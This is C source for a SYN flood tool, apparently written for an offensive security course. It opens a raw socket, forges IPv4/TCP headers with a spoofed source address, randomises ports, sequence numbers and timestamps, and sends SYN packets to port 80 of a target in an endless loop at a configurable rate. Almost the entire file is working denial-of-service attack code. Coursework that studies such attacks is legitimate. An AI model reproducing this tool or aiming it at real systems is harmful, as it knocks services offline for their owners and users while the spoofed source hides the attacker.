// SYN flooder for the offensive technologies course
// Credits to https://gist.github.com/yorickdewid/a6e4f7181bfcb6aad5cc

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <time.h> 

static unsigned long long int cnt = 0;

struct pseudo_header {
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};
 
unsigned int rndUInt() {
	unsigned int x = rand() & 0xff;
	x |= (rand() & 0xff) << 8;
	x |= (rand() & 0xff) << 16;
	x |= (rand() & 0xff) << 24;
	return x;
}

unsigned short rndUShort() {
	unsigned short x = rand() & 0xff;
	x |= (rand() & 0xff) << 8;
	return x;
}
 
unsigned short csum(unsigned short *ptr, int nbytes)  {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while(nbytes>1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte) =* (u_char*)ptr;
		sum += oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

void inthandler(int sig) {
	printf("Packets sent %lu\n", cnt);
	signal(sig, SIG_IGN);
	exit(0);
}

int main(int argc, char *argv[]) {

	unsigned int init_timestamp = 0;
	int rate = 1000;

	if (argc < 3 || argc > 5) {
		fprintf(stderr, "Usage: %s [DST] [SRC] [optional TIME] [optional Packets Per Second]\n", argv[0]);
		return 1;
	}
	
	if (argc > 3) {
		char* tmp;
		init_timestamp = strtoul(argv[3], &tmp, 10);
	}
	
	if (argc > 4) {
		rate = atoi(argv[4]);
		if (rate <= 0)
			rate = 1000000;
	}

	srand(time(NULL));

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!s) {
		perror("Failed to create socket, u no root?");
		exit(1);
	}

	char datagram[4096], source_ip[32], *data, *pseudogram;
	memset(datagram, 0, 4096);
	 
	struct iphdr *iph = (struct iphdr *)datagram;
	 
	struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	unsigned short optLen = 20;
	char tmpbuff[] = "\x02\x04\x05\xb4\x04\x02\x08\x0a\xaa\xaa\xaa\xaa\x00\x00\x00\x00\x01\x03\x03\x07"; // tcp options
	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
	memcpy(data, tmpbuff, optLen); // append tcp options as payload (not actual payload)
	 
	strcpy(source_ip, argv[2]);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	 
	// ip head
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + optLen;
	iph->frag_off = 0;
	iph->frag_off |= ntohs(IP_DF);
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr(source_ip); // spoof the source addt
	iph->daddr = sin.sin_addr.s_addr;
	 
	// tcp head
	tcph->source = htons(1234);
	tcph->dest = htons(80);
	tcph->ack_seq = 0;
	tcph->doff = 10;  //tcp header size extended for options (was 5)
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(29200);
	tcph->check = 0;
	tcph->urg_ptr = 0;
	 
	psh.source_address = inet_addr(source_ip);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + optLen);
	 
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + optLen;
	pseudogram = malloc(psize);
	memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
	
	int one = 1;
	const int *val = &one;
	 
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0) {
		perror("Error setting IP_HDRINCL");
		exit(0);
	}

	signal(SIGINT, inthandler);
	
	clock_t start, end, last;
	start = clock();
	double thrs = 1/(double)rate;
	
	// Start the tsumani.....
	while (1) {
		if(((clock() - last) / (double)CLOCKS_PER_SEC) > thrs)
		{
			unsigned short ip_id = rndUShort(); // random ip id
			iph->id = htons(ip_id);
			memset(&(iph->check),0,2);
			iph->check = csum((unsigned short *)datagram, iph->tot_len);
			unsigned short sport = rndUShort(); // random source port
			if (sport < 1024) // cannot be less than 1024
				sport += 1025;
			tcph->source = htons(sport);
			unsigned int seqn = rndUInt(); // random seq number
			tcph->seq = htonl(seqn);
			unsigned int timestamp;
			if (init_timestamp > 0) { // compute timestamp based on init_timestamp
				end = clock();
				double delta_t = (end - start) / (double)CLOCKS_PER_SEC;
				unsigned int delta_t_int = (unsigned int)(delta_t*1000);
				timestamp = init_timestamp + delta_t_int;
				timestamp = htonl(timestamp);
			}
			else { // compute random timestamp
				timestamp = rndUInt();
			}
			memcpy(data+8, (char*)&timestamp, 4);
			memset(&(tcph->check),0,2);
			memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + optLen);
			tcph->check = csum((unsigned short*)pseudogram , psize);
			if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin))<0) {
				perror("sendto failed");
				return 1;
			} else {
				last = clock();
				if (cnt%1000000==0)
					printf("Packet Send. Length: %d %luM\n", (iph->tot_len)+14, (cnt/1000000));
				++cnt;
			}
		}
	}
	 
	return 0;
}
